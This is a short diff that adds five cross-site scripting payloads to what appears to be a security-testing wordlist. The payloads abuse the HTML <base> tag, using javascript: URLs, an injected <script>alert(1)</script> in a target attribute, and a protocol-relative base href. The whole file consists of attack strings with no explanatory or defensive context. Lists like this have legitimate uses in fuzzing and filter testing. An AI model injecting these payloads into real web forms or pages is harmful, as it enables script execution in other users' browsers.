@@ -1,0 +1,6 @@
+<base target="<script>alert(1)</script>"><a href="javascript:name">XSS</a>
+<base href="javascript:/"><a href="**/alert(1)"><base href="javascript:/"><a href="**/alert(1)">
+<base href=//0>
+<BASE HREF="javascript:javascript:alert(1);//">
+<BASE HREF="javascript:alert('XSS');//">
+
